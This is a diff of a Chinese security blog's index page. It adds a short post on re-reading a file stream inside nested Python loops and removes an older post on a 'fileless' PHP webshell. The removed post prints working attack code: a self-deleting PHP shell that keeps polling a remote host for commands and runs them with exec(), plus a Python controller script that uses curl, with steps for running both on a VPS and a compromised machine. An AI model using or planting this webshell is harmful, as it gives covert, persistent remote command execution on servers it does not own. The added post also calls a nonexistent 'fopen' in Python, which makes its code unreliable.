@@ -232,6 +232,143 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yangge.me/2019/05/13/python中fopen的问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yangge">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/05/13/python中fopen的问题/" itemprop="url">python中fopen的问题</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-13T10:22:32+08:00">
+                2019-05-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/05/13/python中fopen的问题/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/05/13/python中fopen的问题/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>最近在写一个小脚本的时候遇到的一个小问题，难倒了多个高级安全工程师，就记录下来了。</p>
+<p>我在做文件读取循环的时候，比较喜欢这么写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f_open = fopen(&apos;1.txt&apos;,&apos;r&apos;)</span><br><span class="line">for i in f_open:</span><br><span class="line">	print()</span><br></pre></td></tr></table></figure></p>
+<p>然后呢，正好有两个文件要进行匹配，那么不就是二次循环嘛<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f_open1 = fopen(&apos;1.txt&apos;,&apos;r&apos;)</span><br><span class="line">f_open2 = fopen(&apos;2.txt&apos;,&apos;r&apos;)</span><br><span class="line">for i in f_open1:</span><br><span class="line">	for d in f_open2:</span><br><span class="line">    	if d in i:</span><br><span class="line">        	print()</span><br></pre></td></tr></table></figure></p>
+<p>然后就发现了，每次只循环2.txt中的list一遍，也就是说，第一个for没起作用。</p>
+<p>最后发现，fopen打开的是一个文件流，循环一遍以后，不会再回到开头，所以只会循环一遍。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f_open1 = fopen(&apos;1.txt&apos;,&apos;r&apos;)</span><br><span class="line">for i in f_open1:</span><br><span class="line">	f_open2 = fopen(&apos;2.txt&apos;,&apos;r&apos;)</span><br><span class="line">	for d in f_open2:</span><br><span class="line">    	if d in i:</span><br><span class="line">        	print()</span><br></pre></td></tr></table></figure>
+<p>这么写就不会有问题了，或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen().read()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yangge.me/2019/04/24/域名前置-Domain-Fronting/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1487,145 +1624,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/06/04/php无文件webshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="yangge">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/06/04/php无文件webshell/" itemprop="url">php无文件webshell</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-04T17:56:49+08:00">
-                2018-06-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/06/04/php无文件webshell/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/06/04/php无文件webshell/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>无文件webshell,就是执行完驻留内存中，主要是利用函数 ignore_user_abort。</p>
-<h4 id="webshell："><a href="#webshell：" class="headerlink" title="webshell："></a>webshell：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">unlink($_SERVER[&apos;SCRIPT_FILENAME&apos;]);</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$remote_file = &apos;http://192.168.192.1:8888/shell.txt&apos;;</span><br><span class="line">while($code = file_get_contents($remote_file))&#123;</span><br><span class="line">  exec($code);</span><br><span class="line">  sleep(5);</span><br><span class="line">  unlink(&apos;1.txt&apos;);</span><br><span class="line">&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>我写了一个客户端，就可以直接调用了。</p>
-<h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">sys_shell = sys.argv[1]</span><br><span class="line">get_shell1 = sys.argv[2]</span><br><span class="line">file = open(&apos;shell.txt&apos;,&apos;w&apos;)</span><br><span class="line">sys_shell1 = sys_shell+&apos;&gt;1.txt&apos;</span><br><span class="line">file.write(sys_shell1)</span><br><span class="line">file.close()</span><br><span class="line">get_shell = &quot;curl &quot;+get_shell1+&quot;/1.txt&quot;</span><br><span class="line">time.sleep(5)</span><br><span class="line">dd = os.popen(get_shell).read()</span><br><span class="line">while True:</span><br><span class="line">    if &apos;404&apos; in dd:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(dd)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
-<p>先在vps运行client.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python client.py whoami http://2.2.2.2</span><br></pre></td></tr></table></figure></p>
-<p>然后在被控机器上运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure></p>
-<p>client.py 那个ip要和shell.php在同一个文件夹</p>
-<p><img src="https://i.loli.net/2018/06/04/5b150f38e5b22.jpg" alt=""></p>
-<p>如果想结束所有进程，只要把client下的shell.txt文件删除，或者置空就可以了。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1680,7 +1678,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
